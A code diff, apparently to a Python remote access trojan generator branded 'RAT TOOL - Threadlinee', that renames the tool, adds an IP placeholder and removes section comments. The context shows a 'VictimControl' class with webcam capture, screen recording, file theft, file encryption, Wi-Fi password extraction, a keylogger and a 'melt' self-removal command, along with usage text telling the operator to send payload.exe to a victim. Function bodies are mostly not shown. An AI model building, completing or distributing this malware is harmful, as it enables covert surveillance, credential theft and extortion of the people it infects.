@@ -12,7 +12,7 @@ def get_local_ip():
         s.close()
         return local_ip
     except:
-        return "192.168.1.3"
+        return "YOUR_IP_HERE"
 
 YOUR_IP = get_local_ip()
 PORT = 4444
@@ -107,7 +107,6 @@ class VictimControl:
 
         return info
 
-    # ====== SURVEILLANCE FEATURES ======
     @staticmethod
     def webcam_snapshot():
         try:
@@ -197,7 +196,6 @@ class VictimControl:
         except Exception as e:
             return f"Failed to start screen recording: {{str(e)}}"
 
-    # ====== FILE SYSTEM OPERATIONS ======
     @staticmethod
     def auto_download():
         downloaded = []
@@ -251,7 +249,6 @@ class VictimControl:
         except Exception as e:
             return f"Zip failed: {{str(e)}}"
 
-    # ====== ENCRYPTION/DECRYPTION ======
     @staticmethod
     def encrypt_file(path):
         try:
@@ -289,7 +286,6 @@ class VictimControl:
         except Exception as e:
             return f"Decryption failed: {{str(e)}}"
 
-    # ====== SYSTEM CONTROL ======
     @staticmethod
     def terminate_process(process_name):
         try:
@@ -335,7 +331,6 @@ class VictimControl:
         except Exception as e:
             return f"Logoff failed: {{str(e)}}"
 
-    # ====== NETWORK OPERATIONS ======
     @staticmethod
     def get_wifi_passwords():
         try:
@@ -371,7 +366,6 @@ class VictimControl:
         except Exception as e:
             return f"Port scan failed: {{str(e)}}"
 
-    # ====== KEYLOGGER ======
     @classmethod
     def keylogger_loop(cls):
         def on_press(key):
@@ -426,7 +420,6 @@ class VictimControl:
         except Exception as e:
             return f"Failed to set clipboard: {{str(e)}}"
 
-    # ====== UTILITY FUNCTIONS ======
     @staticmethod
     def check_internet():
         try:
@@ -592,7 +585,7 @@ def handle_command(sock, cmd):
             data = VictimControl.melt()
             sock.send(data.encode())
         elif cmd == "help":
-            help_text = """=== Ultimate RAT v3.0 - 40+ Features ===
+            help_text = """=== RAT TOOL  - Threadlinee ===
 
 [📁] File System:
 - file_list [path]        - List directory contents
@@ -705,7 +698,6 @@ def start_listener():
     s.listen(1)
     print(f"[*] Listening on {YOUR_IP}:{PORT}... (Run payload.exe on target)")
     
-    # Create directories for received files
     os.makedirs("{SCREENSHOT_DIR}", exist_ok=True)
     os.makedirs("{WEBCAM_DIR}", exist_ok=True)
     os.makedirs("{AUDIO_DIR}", exist_ok=True)
@@ -870,7 +862,7 @@ def generate_files():
     )
     
     print(f'''
-[✅] Ultimate RAT v3.0 - 40+ Features
+[✅] RAT TOOL  - GitHub Threadlinee
 
 [🔥] How to Use:
 1. Send dist/payload.exe to victim
